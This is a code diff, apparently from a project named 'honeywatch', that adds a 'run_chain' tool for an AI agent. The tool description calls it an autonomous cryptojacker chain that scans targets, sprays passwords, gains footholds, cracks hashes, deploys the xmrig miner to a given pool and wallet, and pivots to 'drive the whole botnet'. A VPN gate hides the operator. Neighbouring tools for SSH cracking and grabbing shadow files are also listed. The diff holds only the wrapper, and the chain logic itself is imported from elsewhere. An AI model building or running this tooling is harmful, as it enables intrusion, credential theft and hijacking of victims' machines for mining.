@@ -383,6 +383,26 @@ _TOOL_SPECS: list[dict[str, Any]] = [
             "required": ["shadow", "wordlist"],
         },
     },
+    {
+        "name": "run_chain",
+        "description": "Run the autonomous cryptojacker chain: scan -> spray -> foothold -> hashcrack -> deploy xmrig -> pivot, looping on growth. Give it targets + pool/wallet and it drives the whole botnet.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "targets": {"type": "string", "description": "comma-separated CIDRs/IPs for recon, e.g. 10.0.0.0/24"},
+                "users": {"type": "string"},
+                "passwords": {"type": "string"},
+                "payload": {"type": "string", "description": "default xmrig"},
+                "pool": {"type": "string", "description": "mining pool URL (required for miner deploy)"},
+                "wallet": {"type": "string", "description": "wallet address (required for miner deploy)"},
+                "hashcrack_wordlist": {"type": "string"},
+                "business_hours": {"type": "boolean"},
+                "max_rounds": {"type": "integer"},
+                "skip_vpn_check": {"type": "boolean"},
+            },
+            "required": ["pool", "wallet"],
+        },
+    },
 ]
 
 
@@ -824,6 +844,39 @@ def _tool_hashcrack(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
     }
 
 
+def _tool_run_chain(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
+    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
+    if not skip and not _require_vpn(ctx):
+        return {"error": "VPN gate blocked the chain. Connect Mullvad or pass skip_vpn_check=true."}
+
+    from honeywatch.chain import ChainConfig, run_chain
+
+    targets = [t.strip() for t in (args.get("targets") or "").split(",") if t.strip()]
+    cfg = ChainConfig(
+        targets=targets,
+        users=[u.strip() for u in (args.get("users") or "").split(",") if u.strip()],
+        passwords=[p.strip() for p in (args.get("passwords") or "").split(",") if p.strip()],
+        payload_id=args.get("payload", "xmrig"),
+        pool=args.get("pool", ""),
+        wallet=args.get("wallet", ""),
+        hashcrack_wordlist=args.get("hashcrack_wordlist", ""),
+        business_hours=bool(args.get("business_hours", False)),
+        max_rounds=int(args.get("max_rounds", 3)),
+        skip_vpn_check=skip,
+        db_path=ctx.db_path,
+    )
+    state = run_chain(cfg)
+    return {
+        "rounds": state.round,
+        "hosts": len(state.hosts),
+        "credentials": len(state.credentials),
+        "footholds": len(state.footholds),
+        "enqueued": len(state.enqueued),
+        "stopped": state.stopped,
+        "stop_reason": state.stop_reason,
+    }
+
+
 def _summarize_scores(scores: list[Score]) -> dict[str, int]:
     from collections import Counter
 
@@ -865,6 +918,7 @@ _tool("crack_ssh", _tool_crack_ssh)
 _tool("list_credentials", _tool_list_credentials)
 _tool("grab_shadow", _tool_grab_shadow)
 _tool("hashcrack", _tool_hashcrack)
+_tool("run_chain", _tool_run_chain)
 
 
 def execute_tool(name: str, args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
